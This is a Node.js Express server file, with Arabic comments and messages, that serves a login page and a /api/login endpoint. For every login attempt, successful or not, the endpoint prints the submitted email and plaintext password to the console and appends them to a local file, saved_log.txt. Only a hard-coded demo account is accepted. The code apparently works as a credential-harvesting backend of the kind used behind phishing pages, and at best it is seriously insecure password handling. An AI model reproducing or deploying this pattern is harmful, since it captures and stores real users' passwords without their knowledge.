const fs = require('fs');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

app.use(express.static(path.join(__dirname, 'public')));

// API endpoint for login
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;

  console.log('=================================');
  console.log('تم استقبال بيانات تسجيل الدخول');
  console.log('البريد الإلكتروني:', email);
  console.log('كلمة المرور:', password);
  console.log('=================================');

// حفظ البيانات في ملف داخل نفس مجلد المشروع
  const record = {
    email: email,
    password: password,
    createdAt: new Date().toISOString()
  };

  fs.appendFileSync(
    path.join(__dirname, 'saved_log.txt'),
    JSON.stringify(record) + '\n'
  );

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      message: 'يجب إدخال البريد الإلكتروني وكلمة المرور.'
    });
  }

  const demoEmail = 'demo@example.com';
  const demoPassword = '123456';

  if (email === demoEmail && password === demoPassword) {
    return res.json({
      success: true,
      message: 'تم تسجيل الدخول بنجاح'
    });
  }

  return res.status(401).json({
    success: false,
    message: 'بيانات الدخول غير صحيحة'
  });
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ ok: true, message: 'الخادم يعمل بشكل طبيعي' });
});

// Serve the frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`الخادم يعمل على http://0.0.0.0:${PORT}`);
});